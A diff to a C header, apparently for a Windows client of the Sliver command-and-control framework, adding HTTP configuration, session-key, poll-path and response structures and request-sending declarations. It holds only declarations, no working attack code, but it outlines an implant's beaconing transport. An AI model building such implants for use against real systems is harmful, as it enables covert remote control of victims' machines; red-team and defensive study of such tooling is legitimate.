@@ -90,6 +90,8 @@ typedef enum _HttpHeader
 	Via,
 	Warning,
 	WwwAuthenticate,
+	UpgradeInsecureRequests,
+	HeaderEnumEnd
 } HttpHeader;
 
 typedef enum _StatusCode {
@@ -162,7 +164,7 @@ typedef struct _HTTP_REQUEST {
 	DWORD dwConnectTimeout;
 	DWORD dwSendTimeout;
 	DWORD dwReceiveTimeout;
-	LPSTR Headers[49];
+	LPSTR Headers[HeaderEnumEnd];
 } HTTP_REQUEST, *PHTTP_REQUEST;
 
 typedef struct _HTTP_SESSION {
@@ -171,12 +173,51 @@ typedef struct _HTTP_SESSION {
 	LPSTR lpProxyAutoConfigUrl;
 } HTTP_SESSION, *PHTTP_SESSION;
 
+typedef struct _HTTP_CONFIG {
+	PWEB_PROXY pProxyConfig;
+	LPSTR lpUserAgent;
+	BOOL DisableUpgradeHeader;
+	LPSTR AdditionalHeaders[HeaderEnumEnd];
+} HTTP_CONFIG, *PHTTP_CONFIG;
+
+typedef struct _SLIVER_HTTP_CLIENT {
+	HTTP_CONFIG HttpConfig;
+	PBYTE pSessionKey;
+	DWORD cbSessionKey;
+	LPSTR lpHostName;
+	DWORD dwPort;
+	BOOL UseStandardPort;
+	LPSTR PollPaths[66];
+	LPSTR PollFiles[109];
+	LPSTR SessionPaths[99];
+	LPSTR SessionFiles[100];
+	LPSTR ClosePaths[57];
+	LPSTR CloseFiles[103];
+	LPSTR lpPathPrefix;
+	DWORD dwMinNumOfSegments;
+	DWORD dwMaxNumOfSegments;
+	UINT64 uEncoderNonce;
+} SLIVER_HTTP_CLIENT, *PSLIVER_HTTP_CLIENT;
+
+typedef enum {
+	PollType,
+	SessionType,
+	CloseType
+} SegmentType;
+
 typedef struct _HTTP_CLIENT {
 	PURI pUri;
 	PHTTP_SESSION pHttpSession;
 	PWEB_PROXY pProxyConfig;
 	HINTERNET hConnection;
 } HTTP_CLIENT, *PHTTP_CLIENT;
+
+typedef struct _HTTP_RESP {
+	PBYTE pRespData;
+	DWORD cbResp;
+	DWORD dwStatusCode;
+	HINTERNET hRequest;
+} HTTP_RESP, *PHTTP_RESP;
 
 PHTTP_CLIENT HttpClientInit
 (
@@ -229,4 +270,21 @@ VOID FreeHttpRequest
 LPSTR GetContentTypeString
 (
 	_In_ ContentTy ContentTypeEnum
+);
+
+PHTTP_RESP SendHttpRequest
+(
+	_In_ PHTTP_CONFIG This,
+	_In_ HttpMethod Method,
+	_In_ LPSTR lpUrl,
+	_In_ LPSTR lpContentType,
+	_In_ LPSTR lpData,
+	_In_ DWORD cbData,
+	_In_ BOOL SetAuthorizationHeader,
+	_In_ BOOL GetRespData
+);
+
+VOID FreeHttpResp
+(
+	_In_ PHTTP_RESP pResp
 );
